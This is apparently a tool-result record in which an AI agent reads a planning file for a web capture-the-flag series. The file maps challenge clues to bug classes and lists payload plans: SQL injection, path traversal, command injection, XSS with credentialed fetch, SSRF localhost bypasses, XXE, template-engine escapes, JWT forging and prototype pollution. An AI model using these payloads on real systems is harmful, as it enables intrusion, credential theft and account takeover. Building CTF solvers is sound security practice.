{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_017qdYxtYJZtBtXe6qjhwj26","type":"tool_result","content":"107\tvalue (callback|internal|status|result|audit, messages|postcards are re-dealt even between single and TT).\n108\tNo concept key (D11-D13, D15) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\n109\tMASTERY: 3-4 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n110\t\n111\tCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\n112\trobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n113\t\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\n114\tsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n115\t?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\n116\tfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\n117\tcallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n118\t      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\n119\tmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n120\t  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\n121\tsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\n122\tpreferences_route, form + hidden csrf_token,           -> CSRF (D09)         -> submit the form's external option with Sec-Fetch-Site:\n123\t  \"obeys whoever asks nicely -- even strangers\"             cross-site, Mode: navigate, Dest: document, foreign Referer; GET /api/preferences\n124\tupload_shape/render_route/preview_guide                -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n125\t  \"upload form has standards. Low ones\"                     content_type:\"text/html\"} -> GET the returned path\n126\t\"template engine evaluates\", \"speak in expressions\",   -> SSTI (D11)         -> feature?template=a${7*7}b{{7*7}}c (one probe per param:\n127\t  empty \"Rendered message\" <pre>                            template|message|q|name|text) -> {{objective}} in the family that gave 49\n128\t\"plant ... come back later\", \"delayed echo\",           -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"} (also\n129\t  feature post_required, secondary {\"rows\":[]}               \"zz' OR 1=1 --\"), GET secondary after each plant -> rows[] has proof\n130\t\"API binds whatever you hand it\", \"promotion\",         -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n131\t  feature post_required, secondary administrator_required    admin, roles:[\"admin\"], access_level, permissions}; GET secondary\n132\tinventory_route + protected_reference, \"take inventory  -> field/action authz -> GET inventory; feature?id=<protected>&fields=<f>&action=<a> for\n133\t  ... every field, every function\", field_action_forbidden    (D14)                 EVERY single f x a (lists / * are forbidden) -> evidence\n134\t\"fetch anything you point it at\", \"internal service\",  -> SSRF (D15)        -> feature?url=http://127.0.0.1:8080<secondary>; port 80/localhost =\n135\t  feature absolute_url_required, secondary internal_only                       fetch_failed -> ladder :8080 :80 :5000 :8000 :3000; param from error\n136\tcurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\n137\teyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\n138\tlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n139\t?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n140\t\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\n141\tSSRF filtered (blocked_host / scheme_not_allowed)      -> SSRF sequel        -> 2130706433, 127.1, [::1], 0.0.0.0, allowed@127.0.0.1, file:///run/...\n142\t/api/v1 vs /v2, \"legacy\", \"beta\", deprecated in docs  -> shadow API (API9)  -> the protected op on every version-swapped / undocumented path\n143\t\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\n144\tXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n145\t\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\n146\tA real victim browser exists (D07): anything \"the admin/reviewer visits\" can run your JS with their cookies; receipts\n147\tcan land >12 s later. \"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin\n148\tmatrix yourself. NEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11\n149\tdid -> TT first try; D09, D10, D12, D13, D15 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n150\t```\n151\t\n152\t## Readiness gaps\n153\t\n154\tPriority 1 = plausible within ~3 calendar days (~6-9 lane-days at the current pace). \"prebuild\" = pure python handler\n155\t(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\n156\tdecoy. \"note\" = harness/prompt change. \"tool\" = install. None built (no web prebuild lane, no `web:*` keys in\n157\t.run/prebuild-state.json). Dropped after D13: `ssti-engine-probe` (seen D11), `port-day22-handlers`. Dropped after\n158\tD15: `ssrf-planner` (seen D15; replaced by `ssrf-filter-bypass`); D14's inventory field x action read folded into\n159\t`bopla-field-read` (now the no-inventory sibling). Added after D15: `ssrf-filter-bypass`, `api-shadow-version`,\n160\t`api-resource-limit-overread`, `api-unsafe-consumption`.\n161\t\n162\t```json\n163\t[\n164\t  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D15 (hctf/prebuild.py has no `web` string at all): hctf/prebuild.py LANES has no `web` entry (AUTO_LANES lists 5 lanes) and .run/prebuild-state.json has no web:* keys, so no prebuild gap below can drain. lib/web/handlers/ already loads per-day plugins `dayNN_*.py` exporting KEY_MAP + HANDLERS (D23 added three) -> the writable target is a new plugin file per gap, e.g. lib/web/handlers/prebuilt_<id>.py, + tests/data/web_fixtures/. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web/handlers/prebuilt_, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web/handlers/__init__.py:_load_plugins,)}`. Fixtures = saved target responses (targets 410 after CORRECT).\"},\n165\t  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D15 repeated it: Fetch Quest TT started 13:18:04Z, ~5 s after single CORRECT, and the codify worker's lib/web/handlers/day24_web_fetch_quest.py landed ~1 min later -> TT solver_incomplete 41 s, live worker hand-solved. Same on D12/D13 (41 s, 12.9 s). D11 (plugin written before submit) and D14 went first try. Owner of hctf/ + web skill: for web, gate TT start on the codify worker (or on solver-test passing the single case), and tell the single worker to write the plugin handler (KEY_MAP + HANDLERS, generic over param/field/route words) before `hctf submit`.\"},\n166\t  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},\n167\t  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n168\t  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},\n169\t  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON (still on D14/D15) shows current_role: analyst; D13 granted admin via JSON body binding (mass assignment, seen) -- the sibling forms are untested. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|administrator|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role=admin / ?admin=1, PATCH/PUT of the profile route with the D13 privilege key set. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n170\t  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n171\t  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n172\t  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py. D14: inventory_route + protected_reference -> fetch inventory JSON {route, query_parameters, fields, actions, public_reference} and enumerate field x action on the protected id (error id_fields_action_required / field_action_forbidden) -- plugin day24_web_the_api_has_opinions.py. D15 (no concept key): feature 400 absolute_url_required + secondary 403 internal_only -> SSRF (feature?url=http://127.0.0.1:8080<secondary>) -- plugin day24_web_fetch_quest.py; error fetch_failed = wrong host/port, keep laddering.\"},\n173\t  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web/ (package; see lib/web/__init__.py): concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one. D15 Mastery had 4 targets (first time); all known handlers answered them in 3.2 s, so the registry works when every class has a plugin -- keep per-host concurrency capped.\"},\n174\t  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n175\t  {\"id\": \"fetch-metadata-matrix\", \"concept\": \"server-judged 'browser' checks: Sec-Fetch-* / Referer / Origin matrix (rows 13a, 24a, 15)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D06 (same-origin callback) and D09 (cross-site CSRF) were both judged purely by request headers, no bot. Pure planner: given a route, a base URL and an optional 'from' page URL, emit header sets {Sec-Fetch-Site: same-origin|same-site|cross-site|none} x {Mode: navigate|cors|no-cors} x {Dest: document|empty|iframe} with matching Referer (from-page / foreign https://evil.example/ / none) and Origin (base / foreign / null), ordered by the error/flag the app returned (browser_callback_required -> same-origin cors; changed_across_sites:false -> cross-site navigate). Parser: evidence/proof regex + boolean flags in the JSON. Fixtures: D06 callback and D09 /api/preferences bodies from day21/day22 logs.\"},\n176\t  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n177\t  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n178\t  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets). D13 (NestJS mass assignment) makes the JSON-merge sibling more likely: after the pollution POST, GET secondary_route (administrator_required) and look for evidence. Raised to 1 after D15: the API run (D13 mass assignment -> D14 property authz) keeps the JSON-object-binding family hot and Node costumes recur.\"},\n179\t  {\"id\": \"ssrf-filter-bypass\", \"concept\": \"SSRF sequels: filtered host/scheme, redirect, file://, blind (row 12b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D15 was the plain form (feature?url=http://127.0.0.1:8080<internal_only route>; port 80 -> fetch_failed). Sequels in the D10->D11 / D03->D12 style: blocklist on 127.0.0.1/localhost -> 2130706433, 0x7f000001, 017700000001, 127.1, 127.0.0.1.nip.io-style only if the app names it, [::1], [::ffff:127.0.0.1], 0.0.0.0; allowlist 'must start with/contain <host>' -> https://<allowed>@127.0.0.1:8080/, http://127.0.0.1:8080#@<allowed>, ?u=<allowed>; scheme filter -> file:///run/huntress/objective.txt, FILE://, gopher only if named; redirect hop via an app-owned open redirect (row 24b) or a clue route that 302s; POST/JSON body {url} when GET 405s; port ladder 8080, 80, 5000, 8000, 3000, 8888, 9000 from error hints. Parser: proof regex in the proxied body, base64/JSON-wrapped content fields. Fixture: D15 error bodies (absolute_url_required, internal_only, fetch_failed) + a mocked blocked_host.\"},\n180\t  {\"id\": \"api-shadow-version\", \"concept\": \"improper API inventory: shadow / deprecated / beta endpoint skips the check (row 39, OWASP API9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D13-D15 walked the OWASP API Top 10 (API3, API5, API7) and D14's prompt said 'take inventory of every endpoint'. Planner: from /api/inventory, /openapi.json, /swagger.json, /api-docs, /v2/api-docs, /api/clues and JS literals, collect every path; emit version swaps (/api/v2/x -> /api/v1/x, /api/x -> /api/v0|beta|internal|legacy|old/x), `X-API-Version: 1`, `?version=1`, `Accept: application/vnd.<app>.v1+json`; call the protected operation (protected_reference / admin route) on each. Parser: proof regex; 403 on the current version + 200 on the shadow = the bug.\"},\n181\t  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n182\t  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies gASV/gAN (pickle), Tzo/YTo (PHP), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Prefer data tampering (isAdmin/role) over code execution; minimal gadget reading the prompt path otherwise.\"},\n183\t  {\"id\": \"ssti-sandbox-escape\", \"concept\": \"SSTI sequels: filtered/sandboxed engine, file read, stored template (row 11b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D11 rendered `{{objective}}` directly (context var) under a Spring Boot costume; `{{T(java.lang.Runtime)}}` printed a class, ${..}/*{..} stayed literal. A sequel may hide `objective` or filter `{{`. Planner: fingerprint by arithmetic family ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}} -> 7777777 Jinja2 / 49 Twig), then per-engine reads of the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / lipsum / request.application, Twig source() / _self.env, SpEL T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/run/huntress/objective.txt')), Freemarker ?new() / ?api, ERB File.read, EJS/Nunjucks/Handlebars constructor chains, Thymeleaf __${..}__::. Filter bypasses: attr()/|join, hex/unicode, request.args indirection. Also plant in stored fields read later (row 37). Parser: proof regex in rendered body.\"},\n184\t  {\"id\": \"stored-second-order-generic\", \"concept\": \"plant now, read on another route: second-order for any class (row 37)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D12 pattern generalised: feature_route = POST sink (`post_required`, `saved:true`), secondary_route = later reader. Planner takes a per-class payload list (SQLi ladder, SSTI `{{objective}}`/`${..}`, cmd `;cat <prompt path>`, XSS for a bot) and plants each as JSON (then form) in every common field (name,q,query,note,label,title,value,filter,search,term,report,display_name,bio,comment,message) in one body, re-GETs every reader route after EACH plant. Parser: proof regex only (D12 prints `effect` even when rows are empty).\"},\n185\t  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL; methods HEAD/POST/PUT/PATCH/OPTIONS + X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, trailing ?/#. Stop at the first 200 with proof or effect.\"},\n186\t  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D03 tautology and D12 second-order are seen. Remaining: ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length/row-count oracle (bounded alphabet [0-9a-f_proof], 32 chars), time-based (sleep/randomblob) only when nothing differs, login bypass admin'--. Payloads delivered as JSON body AND query/form (D12 bound JSON only). SQLite/MySQL/Postgres dialects. Title puns to expect: \\\"yes or no\\\", \\\"takes its time\\\", \\\"union\\\".\"},\n187\t  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Numeric fields (negative, zero, huge, float), coupon/redeem replay, ~20-request parallel burst for a single-use action, reset tokens the app leaks (timestamp, md5(email), sequential). No credential guessing.\"},\n188\t  {\"id\": \"type-juggling-auth\", \"concept\": \"loose comparison / JSON type confusion in auth or token checks (row 34)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"PHP/Laravel or Node costume with a token/PIN/password compare. JSON bodies with true, 0, \\\"0\\\", [], {}, null, \\\"0e1\\\" magic hashes, arrays where strings are expected (strcmp(array) == 0), numeric strings with whitespace. Field names from the form/clues. Parser: effect+evidence / proof.\"},\n189\t  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n190\t  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n191\t  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n192\t  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Introspection query, list fields, query hidden ones (proof, secret, evidence, note) and node(id) lookups (IDOR over GraphQL); field suggestions when introspection is off.\"},\n193\t  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n194\t  {\"id\": \"upload-filter-bypass\", \"concept\": \"upload sequels: enforced type filter, served-path traversal, stored SVG/HTML (row 20b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D10's policy (txt, text/plain) was never enforced. Sequel planner over the same upload_shape (JSON filename/content/content_type, or multipart if the form says so): double extension (n.txt.html, n.html.txt), case (N.HTML), trailing dot/space, content_type spoof vs extension, GIF89a/PNG magic prefix, filename traversal (../n.html, ..%2fn.html) to land in a served dir named by the clues, SVG with script or XXE, template syntax in the content per the guide. Parser: read the returned path/url, GET it, proof regex.\"},\n195\t  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"},\n196\t  {\"id\": \"bopla-field-read\", \"concept\": \"excessive data exposure / hidden-field read on API routes (row 36)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D14 showed the property-level read side through an explicit `fields`+`action` pair on an inventory-listed route (seen, handler exists). Remaining sibling: routes WITHOUT an inventory where hidden keys come back through ?fields=*, ?include=all, ?expand=*, ?view=admin|full|debug, ?debug=1, Accept: application/vnd.api+json, or list endpoints returning keys the HTML omits (secret, proof, note, internal). Compare key sets against the page. Parser: proof regex after JSON flattening.\"},\n197\t  {\"id\": \"api-resource-limit-overread\", \"concept\": \"unrestricted resource consumption / pagination over-read (row 40, OWASP API4)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"List routes with limit/page_size/per_page/offset/page: plan limit=1000|100000|-1|0, page=0|-1, offset beyond the public window, size=all, and batch/array ids (id=1,2,3 / ids[]=). Look for records past the public set carrying proof/secret. No flooding: <= 10 requests.\"},\n198\t  {\"id\": \"http-param-pollution\", \"concept\": \"duplicate params / keys split between proxy and app (row 35)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"For a route whose check and action read the same param: a=safe&a=evil, a[]=..., JSON duplicate keys (first vs last wins), mixed query + body copies, ; separators. Order the planner by which copy the error names. Parser: proof regex.\"},\n199\t  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},\n200\t  {\"id\": \"api-unsafe-consumption\", \"concept\": \"app trusts a third-party / webhook / callback response (OWASP API10)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Routes that import from a URL or accept a webhook payload and then act on the content (e.g. 'sync profile from partner'): point at an app-owned echo/paste route or a data: URL we control, return JSON with role/admin/redirect fields; chains with SSRF (row 12) and mass assignment (row 9). Parser: proof regex on the follow-up secondary route.\"}\n201\t]\n202\t```\n203\t"}]},"parent_tool_use_id":null,"session_id":"2f22de87-85c6-4735-9cd3-ecbd50af08de","uuid":"dd05026c-2fe4-4b25-8455-4dd868850b70","timestamp":"2026-10-25T13:06:57.046Z","tool_use_result":{"type":"text","file":{"filePath":"/home/testpwn/huntress-2026/reference/coverage/web.md","content":"value (callback|internal|status|result|audit, messages|postcards are re-dealt even between single and TT).\nNo concept key (D11-D13, D15) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\nMASTERY: 3-4 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\nsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\nfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\ncallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, form + hidden csrf_token,           -> CSRF (D09)         -> submit the form's external option with Sec-Fetch-Site:\n  \"obeys whoever asks nicely -- even strangers\"             